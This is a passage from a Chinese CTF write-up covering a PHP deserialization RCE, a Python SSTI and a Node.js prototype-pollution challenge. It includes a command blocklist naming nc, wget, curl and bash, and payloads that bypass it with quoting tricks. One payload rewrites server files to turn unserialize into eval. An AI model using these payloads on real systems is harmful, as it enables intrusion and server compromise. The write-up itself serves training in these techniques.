punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"alright"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token comment">//wanna try?</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>还是很简单的 rce，通过__destruct 函数中的 echo 函数来触发 minipop 类中的__tostring 函数，然后就是无回显 rce，可以看到过滤了很多，本题依旧具有写入权限，像 ls &gt; 1.txt 这种方式是用不了了，但 tee 命令可以使用 t''ee 来绕过，于是便有了第一种解法：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /flag_is_h3eeere | t''ee 1"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ne</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">minipop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">minipop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>看了下官方题解，官方给的非预期解是通过 script 命令，和 tee 这种殊途同归，不过我还是第一次了解到这个命令，长见识了...</p><p>可以参考这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTMxOTUtMS5odG1s">Linux script 命令 —— 终端里的记录器</span></p><p>官方给的预期解是 bash 盲注：</p><p><span class="exturl" data-url="aHR0cHM6Ly9zaGltby5pbS9kb2NzL1FQTVJ4ekdrdHpzWm56aHovcmVhZA==">https://shimo.im/docs/QPMRxzGktzsZnzhz/read</span></p><p>关于 bash 盲注，可以参考这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyYWN4aS9hcnRpY2xlL2RldGFpbHMvMTIxODk2MDU0">命令执行漏洞</span></p><p>简单解释一下这个脚本，先引入 time，requesets 库，然后构造命令，awk 命令就是一行一行读取文件内容，后面的 NR 就是对应的行数，然后 cut -c 就是以字符为单位取出字符，和字符集比较开始爆破，如果成功就停顿两秒，后面 time 函数显然就是与它配合使用的。</p><p>这里再说一道有意思的解法，在这之前可以参考下这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyYWN4aS9hcnRpY2xlL2RldGFpbHMvMTIxOTk3MTY2">CTFshow php 特性 web136</span></p><p>对于其中所用到的 sed 命令和 xargs 命令可以看看这个文档：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLXNlZC5odG1s">Linux sed 命令</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLXhhcmdzLmh0bWw=">Linux xargs 命令</span></p><p>它这里用了以下两个命令：</p><p><code>ls | xargs sed -i &quot;s/die/echo/&quot;</code><br>把 die 替换成 echo<br><code>ls | xargs sed -i &quot;s/exec/system/&quot;</code><br>把 exec 替换成 system</p><p>首先列出目录下的文件，xargs 命令是为了配和管道符使用，因为 ls 命令可能不支持使用管道符，然后 sed 修改这个文件内容。</p><p>不过很明显，它这道题的代码逻辑和本题并不相同，对于本题，我们可以这样写：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">minipop</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$qwejaskdjnlka</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">#public $code="ls;cat /flag_is_h3eeere | script 1";</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls | xargs sed -i 's/unserialize/eval/'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">minipop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qwejaskdjnlka</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">minipop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>将 unserialize 函数替换成 eval 函数，就可以随便玩了。</p><h3 id="genshin"><a class="anchor" href="#genshin">#</a> GenShin</h3><p>进入题目让我们</p><blockquote><p>Oh!try to find some information that is useful~</p></blockquote><p>在响应包中看到 /secr3tofpop</p><p>进入后：</p><blockquote><p>please give a name by get</p></blockquote><p>测试后发现是 Python 简单的 SSTI，ban 掉了一些类，像 init,popen 等等啥的，还有单引号也被过滤了，万幸的是双引号还能用，popen 可以用 &quot;pop&quot;+&quot;en&quot; 拼接绕过，</p><p>我的解法是通过找它的 file 类来得到 flag 的：</p><p><img data-src="../../../images/Iknowyouwillstop/23.png" alt="21"></p><p>不过这种方法有个弊病，就是如果不知道文件名就无法包含。</p><p>在第 414 找到，然后：</p><p><img data-src="../../../images/Iknowyouwillstop/21.png" alt="21"></p><p>得到 flag。</p><p>官方 wp 是直接利用内置函数来获取的：</p><p><img data-src="../../../images/Iknowyouwillstop/22.png" alt="21"></p><h3 id="otenkigirl"><a class="anchor" href="#otenkigirl">#</a> OtenkiGirl</h3><p>考察原型链污染，可以参考以下文章：</p><p><a target="_blank" rel="noopener" href="https://www.yuque.com/cnily03/tech/js-prototype-pollution?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgwMjQ5NDIsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5ODAyNDY0MiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMyODgzMDc4NH0.pn6NPU5qfmCdQyooh3tn2iYG1ZiVDRegqSoDUvfZ68w"><strong>JavaScript 原型链污染</strong></a></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmx4c2Nsb3VkLnRvcC8yMDIyLzExLzEzL25vZGVqcyVFNSU4RSU5RiVFNSU5RSU4QiVFOSU5MyVCRSVFNiVCMSVBMSVFNiU5RiU5MyVFNSU5RiVCQSVFNyVBMSU4MCVFNyU5RiVBNSVFOCVBRiU4Ni8=">Nodejs 原型链污染攻击基础知识</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1s">深入理解 JavaScript Prototype 污染攻击</span></p><p>根据题目附件中给的 hint.txt 文件：</p><blockquote><p>『「routes」フォルダーだけを見てください。SQL インジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。</p></blockquote><p>翻译一下就是本题只需要查看 route 目录中的文件且与 SQL 注入没关系，所以不用考虑 SQL 注入。</p><p>而 route 目录下有三个文件：info.js sql.js submit.js。</p><p>那就审计一下 info.js 和 submit.js。</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//info.js</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 导入 Koa Router 模块</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">const</span> Router <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"koa-router"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 创建 Koa Router 的新实例</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// 导入 SQL 模块（假设这是一个自定义模块）</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">const</span> <span class="token constant">SQL</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./sql"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// 创建 SQL 类的新实例，表名为 "wishes"</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQL</span><span class="token punctuation">(</span><span class="token string">"wishes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// 导入 CONFIG 和 DEFAULT_CONFIG 模块</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">const</span> <span class="token constant">CONFIG</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">const</span> <span class="token constant">DEFAULT_CONFIG</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../config.default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// 定义一个异步函数 getInfo，根据时间戳检索愿望数据</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token parameter">timestamp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">// 检查时间戳是否为数字，否则使用当前时间戳</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    timestamp <span class="token operator">=</span> <span class="token keyword">typeof</span> timestamp <span class="token operator">===</span> <span class="token string">"number"</span> <span class="token operator">?</span> timestamp <span class="token operator">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">// 移除在指定的最小公开时间之前的测试数据</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">let</span> minTimestamp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token constant">CONFIG</span><span class="token punctuation">.</span>min_public_time <span class="token operator">||</span> <span class="token constant">DEFAULT_CONFIG</span><span class="token punctuation">.</span>min_public_time<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    timestamp <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> minTimestamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">// 执行 SQL 查询以检索时间戳大于或等于提供的时间戳的愿望数据</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> sql<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">[</span>timestamp<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> e <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token comment">// 返回检索到的数据</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">return</span> data<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">// 处理 POST 请求到 "/info/:ts?" 端点</span></pre></td></tr><tr><td data-num="36"></td><td><pre>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/info/:ts?"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">// 检查内容类型是否为 "application/x-www-form-urlencoded"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">"content-type"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="41"></td><td><pre>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Content-Type 必须为 application/x-www-form-urlencoded"</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token comment">// 如果请求参数中未提供时间戳，则设置默认值为 0</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> ctx<span class="token punctuation">.</span>params<span class="token punctuation">.</span>ts <span class="token operator">===</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span>params<span class="token punctuation">.</span>ts <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token comment">// 从请求参数解析时间戳并进行验证</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">const</span> timestamp <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[0-9]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>params<span class="token punctuation">.</span>ts <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">Number</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>params<span class="token punctuation">.</span>ts<span class="token punctuation">)</span> <span class="token operator">:</span> ctx<span class="token punctuation">.</span>params<span class="token punctuation">.</span>ts<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> timestamp <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"参数 ts 无效"</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token comment">// 调用 getInfo 函数根据提供的时间戳检索愿望数据</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getInfo</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> e <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token comment">// 发送包含检索到的数据的成功响应</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"success"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            <span class="token literal-property property">data</span><span class="token operator">:</span> data</pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token comment">// 处理错误并发送错误响应</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="69"></td><td><pre>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"内部服务器错误"</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token comment">// 导出该路由以供其他模块使用</span></pre></td></tr><tr><td data-num="75"></td><td><pre>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></pre></td></tr></table></figure><p>说白了关键点就在这里：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 移除在指定的最小公开时间之前的测试数据</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">let</span> minTimestamp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token constant">CONFIG</span><span class="token punctuation">.</span>min_public_time <span class="token operator">||</span> <span class="token constant">DEFAULT_CONFIG</span><span class="token punctuation">.</span>min_public_time<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>timestamp <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> minTimestamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这段代码用于确保时间戳 <code>timestamp</code> 不会早于指定的最小公开时间。首先，它从配置中获取最小公开时间（ <code>CONFIG.min_public_time</code> ），如果未定义，则使用默认配置中的值（ <code>DEFAULT_CONFIG.min_public_time</code> ）。然后，它将这个最小时间戳和传入的时间戳 <code>timestamp</code> 进行比较，取两者中较大的一个，确保最终的时间戳不会早于最小公开时间。</p><p>看了下 config.js，发现并没有配置 min_public_time，而 default_config.min_public_time 中有 min_public_time: &quot;2019-07-09&quot;,</p><p>所以我们不能查看 2019-07-09 前的数据，因此我们的目的就是为了能够看到 2019-07-09 前的数据。</p><p>接下来就是找到能够进行原型链污染的地方，审计 submit.js:</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//submit.js</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 导入 Koa Router 模块</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">const</span> Router <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"koa-router"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 创建 Koa Router 的新实例</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// 导入 SQL 模块（假设这是一个自定义模块）</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">const</span> <span class="token constant">SQL</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./sql"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">// 创建 SQL 类的新实例，表名为 "wishes"</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQL</span><span class="token punctuation">(</span><span class="token string">"wishes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// 导入 Base58 模块</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">const</span> Base58 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"base-58"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// 定义 Base58 编码使用的字符集</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">const</span> <span class="token constant">ALPHABET</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">// 生成指定长度的随机文本</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">const</span> <span class="token function-variable function">rndText</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">length</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> length <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token constant">ALPHABET</span><span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span 